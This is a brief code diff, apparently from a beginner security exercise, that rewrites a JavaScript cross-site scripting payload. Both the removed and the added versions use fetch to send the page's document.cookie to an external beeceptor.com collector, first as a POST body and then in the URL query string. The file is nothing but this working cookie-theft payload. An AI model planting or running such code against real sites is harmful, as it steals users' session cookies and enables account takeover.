@@ -1,5 +1,2 @@
-fetch('https://newbiesecstream.free.beeceptor.com', {
-method: 'POST',
-mode: 'no-cors',
-body:document.cookie
-});
+fetch('https://newbiesecstream.free.beeceptor.com/?' + document.cookie);
+
